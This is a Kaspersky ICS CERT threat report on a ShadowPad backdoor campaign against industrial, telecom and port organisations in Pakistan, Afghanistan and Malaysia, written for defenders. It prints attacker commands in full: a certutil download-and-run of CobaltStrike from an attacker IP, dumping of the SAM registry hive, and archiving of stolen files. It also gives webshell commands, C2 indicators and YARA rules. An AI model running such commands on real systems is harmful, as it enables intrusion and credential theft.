@@ -1,0 +1,317 @@
+0: 6/28/22, 5:07 PM
+1: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+2: Attacks on industrial control systems usingShadowPad
+3: ics-cert.kaspersky.com/publications/reports/2022/06/27/attacks-on-industrial-control-systems-using-shadowpad
+4: June 27, 2022
+5: 27 June 2022
+6: Executive summary
+7: In mid-October 2021 Kaspersky ICS CERT researchers uncovered an active ShadowPadbackdoor infection on industrial control systems (ICS) in Pakistan.
+8: Infected machinesincluded engineering computers in building automation systems that are part of theinfrastructure of a telecommunications company.
+9: During the investigation researchers uncovered larger-scale activity by the threat actor inthe network of the telecommunications company and also identified other victims of thecampaign.
+10: We found malicious artifacts in organizations in the industrial andtelecommunications sectors in both Pakistan and Afghanistan.
+11: Moreover, another attackwas uncovered, using an earlier, but with very similar set of tactics, techniques andprocedures (TTPs), against a logistics and transport organization (a port) in Malaysia.
+12: Apparently, the wave of attacks uncovered by the experts began in March 2021.
+13: Some of the victim organizations were breached by exploiting the CVE-2021-26855vulnerability in Microsoft Exchange.
+14: During the investigation we found additional tools and commands used by the threatactor after the initial infection.
+15: From March to October 2021, the ShadowPad backdoor was downloaded to victimcomputers as the mscoree.dll file, which was launched by AppLaunch.exe – aperfectly legitimate application.Later the attackers launched ShadowPad using DLL hijacking in a legitimate OLE-COM object viewing application (OleView).After the initial infection the attackers first sent commands manually, thenautomatically.Other tools were also used:
+16: The CobaltStrike framework, which was downloaded to victim machines usingthe certutil.exe utility, compiled aspx web shells, and procdump and Mimikatztools;The PlugX backdoor;BAT files (for stealing credentials);Web shells (for remote access to the web server);The Nextnet utility (for scanning network hosts).
+17: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+18: The attackers used domains registered with NameSilo, GoDaddy.com and ENOM tocommunicate with the command-and-control (C2) servers.
+19: Most of the C2 servers werehosted on dedicated servers rented from Choopa.
+20: The newly identified attacks on a variety of organizations had an almost totally unique setof TTPs, which leads us to believe that the same Chinese-speaking threat actor wasbehind all of these attacks.
+21: At the time of writing, we do not know the ultimate goal of the attacker.
+22: We think it wasprobably data harvesting.
+23: We believe that it is highly likely that this threat actor will strike again and we will findnew victims in different countries.
+24: The full report is available on the Kaspersky Threat Intelligence portal.For more information please contact ics-cert@kaspersky.com.
+25: Initial infection
+26: In mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPadbackdoor that affected a number of industrial control systems in Pakistan, specificallyengineering computers in building automation systems that are part of a telecomcompany’s infrastructure.
+27: A further analysis of the attack revealed other organizationsaffected by it – manufacturing and telecommunications companies in Pakistan, atelecomnunications company in Afghanistan, and a logistics and transport organization (aport) in Malaysia.
+28: Apparently, the wave of attacks uncovered by the experts began inMarch 2021.
+29: The attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as theinitial attack vector in several victim organizations.
+30: We do not have evidence that CVE-2021-26855 was exploited in all cases of attack identified, but we can assume that theattackers could use this particular vector to penetrate in other cases, as well.
+31: ShadowPad
+32: In the course of our investigation, we determined that in the beginning of March 2021,the ShadowPad backdoor was downloaded on the attacked computers under the guise ofthe mscoree.dll file, which was launched by the legitimate application AppLaunch.exelocated in the same folder with ShadowPad.
+33: AppLaunch.exe was executed by creating atask in the Windows Task Scheduler.
+34: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+35: Export table of the mscoree.dll (ShadowPad) maliciouis DLL
+36: In some of the cases we studied at the same time, we found that a ShadowPad sample thathad the same name and launching scheme was executed by exploiting the MS ExchangeCVE-2021-26855 vulnerability.
+37: Since about mid-October 2021, a new ShadowPad launching scheme and a new version ofthe malware has been used targeting the same organizations.
+38: Instead of usingmscoree.dll, the attackers switched to using the dll hijacking technique in legitimatesoftware for viewing OLE-COM objects (OleView).
+39: The legitimate OleView applicationdownloads the malicious IVIEWERS.dll library, which in turn downloads and executesthe ShadowPad payload contained in IVIEWERS.dll.dat.
+40: The Windows Task Scheduler was also used for the new ShadowPad version to get afoothold in a system.
+41: In total, we managed to find 25 unique modifications.
+42: A more detailed analysis of some modifications of the new ShadowPad version ispresented in a recent report published by PwC.
+43: Post-exploitation
+44: We found that on a subset of computers (at least one in each attacked organization’snetwork), some series of commands had been remotely executed via the command lineinterface (cmd.exe).
+45: At first, the attackers entered the commands manually (this is indicated by both the timeintervals between commands and the resulting output not being redirected to anythingother than standard output).
+46: The list of commands executed by the attackers manually is shown in the originalsequence in the table below.
+47: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+48: Command
+49: Description
+50: cmd.exe /C arp -a > $temp\gGjrIFGa.tmp 2>&1
+51: quser.exe
+52: netstat -anonetstat user
+53: xcopy.exe /s $user\desktopc:\$recycle.bin\temp\■■■\
+54: ping.exe 8,8,8,8ping.exe google.comping.exe 167.179.64.62
+55: net use \\10.126.209.24 “■■■■■■■” /u:■■\■■■■■
+56: cmd.exe m1.log
+57: reg.exe save hklm\sam sam.hive
+58: cmd.exe /C $programfiles\winrar\rar.exe a -r -hp1234 C:$recycle.bin\10020111desk.rar$user\desktop\*.txt $user\desktop\*.xls*$user\desktop\*.pdf $user\desktop\*.doc*$user\desktop\*.jpg > $temp\lwefqERM.tmp 2>&1
+59: winrar.exe a -r -ep1 -p3210 -m5 -s  -iback nat temp
+60: $windir\appcompat\programs\xerice.exe10.251.115.0/24
+61: output the current ARP cachetable for all interfaces to a file inthe $temp directory
+62: collect information about usersauthorized in the system
+63: collect information about activeusers and network connections
+64: copy all files from the desktop tothe recycle.bin folder (it is worthnoting that the organization’sdomain name is also present inthe path)
+65: check the availability of internetservices, probably including theattackers’ infrastructure
+66: mount a network drive using alegitimate domain account
+67: launch Trojan-PSW.Win32.Mimikatz
+68: save registry key containingNTLM hashes to disk
+69: archive the files collected thatpotentially contain confidentialinformation
+70: archive the files collected usingthe console version of WinRar
+71: scan hosts on the network usingthe nextnet utility (an open-source tool written in Go)
+72: Later, the attackers began to distribute a malicious script for cmd.exe over the networksof attacked organizations.
+73: The script was almost completely identical (in terms of itscontents and the sequence of commands) to the manual activity sequence detectedearlier, but it contained an operator to redirect the output of execution results to a file.
+74: The script for cmd.exe that was discovered  was not only delivered over the network, butwas also added by the attackers to the task scheduler for daily execution.
+75: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+76: Example of a script designed to automate the process of collecting data on attacked computers
+77: It is important to note that this part of the TTPs is quite unique and we believe it supportsattributing all cases of similar activity to one Chinese-speaking group of attackers.
+78: The artifacts found indicate that the attackers stole domain authentication credentialsfrom at least one account in each attacked organization (probably from the samecomputer that was used to penetrate the network).
+79: These credentials were used to furtherspread the attack over the network, first manually and then in automatic mode.
+80: Additional tools
+81: CobaltStrike
+82: The attackers used CobaltStrike, which was downloaded to the victim’s computer usingthe certutil.exe utility, compiled aspx webshells, the procdump tool, and Mimikatz.
+83: CobaltStrike was downloaded using the following command:
+84: "$system32\cmd.exe" /c certutil.exe -urlcache -split -fhxxp://116.206.92[.
+85: ]26:82/update.exe &amp;&amp; update.exe &amp;&amp;certutil.exe -urlcache -split -f hxxp://116.206.92[.
+86: ]26:82/update.exe delete
+87: PlugX backdoor – aro.dat
+88: In addition to the ShadowPad backdoor, activity associated with downloading aro.dat, avariant of the PlugX backdoor, using bitsadmin was identified on the server of one of thevictims.
+89: Downloading aro.dat backdoor
+90: A description of the PlugX backdoor is provided in an article published by Palo AltoNetworks.
+91: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+92: Bat file for credential theft
+93: A bat file was found on a mail server of one of the victims, which the attackers used tocollect information and steal the NTLM hashes of accounts.
+94: Bat file found on a victim’s server
+95: The contents of this file are very similar to the bat file described in a VB article, whichmentions that the script was used by the Chinese group HAFNIUM.
+96: Webshell
+97: Malicious dll files were found on the victim’s mail servers.
+98: These are compiled .NETAssembly files for aspx scripts used by the actor for remote access to the web server(webshell).
+99: Example of malicious dll webshell
+100: The sequence of commands sent by default to the victim’s webshell was tracked earlier inthe well-known China Chopper Webshell:
+101: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+102: "cmd" /c cd /d "C:/inetpub/wwwroot/aspnet_client"&amp;whoami&amp;echo[S]&amp;cd&amp;echo [E]"
+103: Infrastructure
+104: The ShadowPad CnC servers found are mostly hosted on rented dedicated Choopaservers.
+105: Domain
+106: First seen
+107: order.cargobussiness[.
+108: ]site
+109: 45.77.249[.
+110: ]48
+111: March 24, 2021
+112: 20473
+113: documents.kankuedu[.
+114: ]org
+115: 45.76.54[.
+116: ]156
+117: March 23, 2021
+118: 20473
+119: live.musicweb[.
+120: ]xyz
+121: 192.248.151[.
+122: ]110 March 17, 2021
+123: obo.videocenter[.
+124: ]org
+125: May 21, 2021
+126: tech.obj[.
+127: ]services
+128: 108.160.133[.
+129: ]247 103.152.255[.
+130: ]82
+131: October 21, 2021October 18, 2021
+132: 20473
+133: houwags.defineyourid[.
+134: ]site 107.191.47[.]52198.13.44[.]4895.179.142[.
+135: ]104
+136: October 28, 2021October 13, 2021October 29, 2021
+137: noub.crabdance[.
+138: ]com
+139: 45.77.243[.]20445.32.101[.]19695.179.142[.]104192.248.180[.
+140: ]109
+141: October 02, 2021October 19, 2021October 28, 2021October 28, 2021
+142: 20473
+143: 20473
+144: grandfoodtony[.
+145: ]com
+146: Victims
+147: We identified malicious artifacts in organizations located in Pakistan and Afghanistanand operating in manufacturing & telecom sectors.
+148: The attack using older TTPs andexploiting the Microsoft Exchange vulnerability also targeted a logistics andtransportation organization (a port) in Malaysia.
+149: Attribution
+150: We believe with a high degree of confidence that a Chinese-speaking threat actor isbehind the activity described in this report.
+151: There are some minor references to HAFNUIM, a Chinese-speaking threat actor, but theyare not sufficient to speak of HAFNUM’s involvement in attacks described in this reportwith a high degree of confidence.
+152: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+153: The Mimikatz utility (m1.log, SHA256:30a78770615c6b42c17900c4ad03a9b708dc2d9b743bbdc51218597518749382),which was identified during our investigation on computers of organizations inPakistan, Malaysia, and Afghanistan, was also mentioned in a Symantec report.
+154: Thereport also claims that the threat actor HAFNIUM was involved in attacksexploiting a Microsoft Exchange Server vulnerability.In addition, a bat file for stealing NTLM hashes of accounts was found on a server ofone of the victims.
+155: The contents of the bat file found are very similar to the bat filedescribed in the VB article, which mentions that this script was used by HAFNIUM.
+156: Activity related to downloading the PlugX backdoor (aro.dat), which occurred on theserver of one of the victims, was analyzed in the Palo Alto Networks report, which allegesthe involvement of a Chinese group known as PKPLUG.
+157: Conclusion
+158: As mentioned above, building automation systems were among the systems attacked inthe campaign described in this report.
+159: We often see accidental infections on such systems,but they are rare targets for APT actors.
+160: Although the final goals of the attack remainunknown, the attackers are most likely interested in gathering information.
+161: We stronglybelieve that those systems themselves could be a valuable source of highly confidentialinformation.
+162: Additionally, we believe there is a chance that they also provide attackerswith a backdoor to other, more strictly secured, infrastructure.
+163: The attackers’ TTPs enabled us to link these attacks to a Chinese-speaking threat actor,and we observed victims located in different regions.
+164: This means that the actor we haveidentified may have broader geographical interests and we could expect more victims tobe discovered in different countries in the future.
+165: Appendix I – Indicators of Compromise
+166: ShadowPad (mscoree.dll)
+167: 91131CCF507F61279268FA857AB53463
+168: 8D5807D8EE69E472764FAEE7269B460B
+169: 1A5856C343597DC219E3F5456018612B
+170: 27F636A36207581E75C700C0E36A8031
+171: ShadowPad (iviewers.dll)
+172: 011BEAF3E9CD2896479313772CD591DE
+173: A7F3BF89F0B41704F185545C784B8457
+174: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+175: 35912C914BD84F23203C8FADAC6D0548
+176: 299980C914250BAC7522DE849F6DF24F
+177: 381616642D2567F8872B150B37E5196B
+178: 31FDAE0B71C290440E0B465B17CF3C8D
+179: 420FCF11240589E8D29DAAB08251831D
+180: 40CD646554ED42D385CA6B55B9D3397D
+181: 61BA23B3B3D132FE0825907C0EA58399
+182: 0CAC537476FD71763C07EDFD7D831F0F
+183: 80EE7A1E9AD4AC6AFCAC83087DC5360F
+184: Bat file for credential theft:
+185: 74E43ECA18E8C92CB332BBB671CE13B8
+186: Trojan-PSW.Win32.Mimikatz.eni (m1.log)
+187: C024E5163AB6DD844813BF0D9A6F082B
+188: Nextnet (xerice.exe)
+189: 86B25E416EEE0F5FB17370F3929E45F4
+190: 8EE863C926D6847D1BF767783E700248
+191: Domains and IPs (ShadowPad C&C)
+192: CobaltStrike hosting and C&C
+193: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+194: storage.ondriev[.
+195: ]tk 116.206.92[.
+196: ]26
+197: api.onedriev[.
+198: ]tk 69.172.80[.
+199: ]131
+200: Yara rules
+201: import "pe"
+202: rule apt_shadowpad_iviewers_dll_variant
+203: meta:
+204: description = "Rule for detecting Shadowpad iviewers.dll variant"
+205: author = "Kaspersky"
+206: copyright = "Kaspersky"
+207: distribution = "DISTRIBUTION IS FORBIDDEN.
+208: DO NOT UPLOAD TO ANYMULTISCANNER OR SHARE ON ANY THREAT INTEL PLATFORM"
+209: version = "1.0"
+210: last_modified = "2022-02-11"
+211: hash = "011BEAF3E9CD2896479313772CD591DE"
+212: hash = "A7F3BF89F0B41704F185545C784B8457"
+213: hash = "35912C914BD84F23203C8FADAC6D0548"
+214: hash = "299980C914250BAC7522DE849F6DF24F"
+215: strings:
+216: $viewers = "VIEWER.dll" fullword
+217: $Iviewers = "IVIEWERS.dll"
+218: $oleview = "OLEViewer"
+219: $comapi = "viewer Copyright" wide
+220: condition:
+221: uint16(0) == 0x5A4D and filesize < 2MB and pe.DLL and ($Iviewers or $comapi or$viewers) and
+222: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+223: not for any i in (0 .. pe.number_of_signatures) : (pe.signatures[0].subject contains"O=Microsoft Corporation")
+224: and not $oleview
+225: rule apt_backdoor_Webshell {
+226: meta:
+227: description = "Rule for detecting backdoor webshell"
+228: author = "Kaspersky"
+229: copyright = "Kaspersky"
+230: distribution = "DISTRIBUTION IS FORBIDDEN.
+231: DO NOT UPLOAD TO ANYMULTISCANNER OR SHARE ON ANY THREAT INTEL PLATFORM"
+232: version = "1.0"
+233: last_modified = "2022-02-11"
+234: hash = "134609a4e2ff86e562a8b63d6350e5c8"
+235: hash = "3de85f25ba23e38b013443bc775484c7"
+236: strings:
+237: $exec = {65 00 78 00 65 00 63 00 5F 00 63 00 6F 00 64 00 65}
+238: $JScriptEvaluate = "JScriptEvaluate"
+239: $JScriptImport = "JScriptImport"
+240: $JScriptPackage = "JScriptPackage"
+241: $CreateEngineWithType = "CreateEngineWithType"
+242: condition:
+243: uint16(0) == 0x5A4D and filesize < 1MB and $exec and $JScriptEvaluate and$JScriptImport and $JScriptPackage and $CreateEngineWithType
+244: Appendix II – MITRE ATT&CK Mapping
+245: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+246: This table contains all the TTPs identified in the analysis of the activity described in thisreport.
+247: Tactic
+248: Technique Technique Name
+249: Execution
+250: T1059.001 Command and Scripting Interpreter: PowerShell
+251: The attacker uses a PowerShell script to download andexecute additional payloads.
+252: T1053.005 Scheduled Task
+253: The attacker creates scheduled tasks for daily execution ofmalicious payloads.
+254: T1047
+255: Windows Management Instrumentation The attacker creates a WMI event to execute aninformation gathering tool on startup.
+256: Persistence
+257: T1197
+258: BITS Jobs The attacker uses a BITS job to download additionalpayloads.
+259: T1574.002 Hijack Execution Flow: DLL Side-Loading
+260: The attacker leverages a legitimate binary to loadShadowPad.
+261: T1053.005 Scheduled Task
+262: The attacker creates scheduled tasks to set up dailyexecution of malicious payloads.
+263: DefenseEvasion
+264: T1197
+265: BITS Jobs The attacker uses a BITS job to download additionalpayloads.
+266: T1140
+267: Deobfuscate/Decode Files or Information Downloaded tools are encoded with base64
+268: T1222.001 File and Directory Permissions Modification
+269: The attacker uses attrib to change the permissions of themalicious files and the working directory to hide them.
+270: T1564.001 Hide Artifacts
+271: The attacker uses attrib to change the permissions of themalicious files and the working directory to hide them.
+272: T1574.002 Hijack Execution Flow: DLL Side-Loading
+273: The attacker leverages a legitimate binary to loadShadowPad.
+274: Discovery
+275: T1083
+276: File and Directory Discovery The attacker lists files and directories available on infectedsystems.
+277: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+278: Tactic
+279: Technique Technique Name
+280: T1046
+281: T1012
+282: Network Service Scanning The attacker uses a pentesting tool to list the NETBIOSservices.
+283: Query Registry The attacker queries the registry to get a history ofconnected USB devices.
+284: Collection
+285: T1560.002 Archive Collected Data: Archive via Utility
+286: The attacker uses the rar tool to create a password-protected archive.
+287: T1560.002 Archive Collected Data: Archive via Library
+288: The attacker compresses the data with a password usingthe Zip library.
+289: T1119
+290: T1005
+291: Automated Collection The attacker automatically collects a list of files andconnected USB devices.
+292: Data from Local System The attacker uses a PowerShell script to collect Officedocuments on the local system.
+293: T1114.001 Email Collection: Local Email Collection
+294: The attacker specifically exfiltrates .pst archives.
+295: Commandand Control
+296: T1071.001 Application Layer Protocol: Web Protocols
+297: The attacker uses web protocols to download additionaltools, exfiltrate data and operate the malware.
+298: T1132.001 Data Encoding: Standard Encoding
+299: The data is encoded using compression with a password.
+300: T1090.001 Proxy: Internal Proxy
+301: The attacker uses netcat and Stowaway-Node to createtunnels inside the victim network.
+302: T1090.002 Proxy: External Proxy
+303: The attacker uses netcat and Stowaway-Node to createtunnels to the outside of the network.
+304: Exfiltration
+305: T1020
+306: Automated Exfiltration The attacker can automatically exfiltrate Office documents.
+307: T1041
+308: Exfiltration Over C2 Channel The attacker exfiltrates data over the C2 channel.
+309: T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud
+310: Storage The attacker exfiltrates data to Google Drive.
+311: Attacks on industrial control systems using ShadowPad | Kaspersky ICS CERT
+312: Authors
+313: Artem Snegirev
+314: Security Researcher, Kaspersky ICS CERT
+315: Kirill Kruglov
+316: Senior Research Developer, Kaspersky ICS CERT
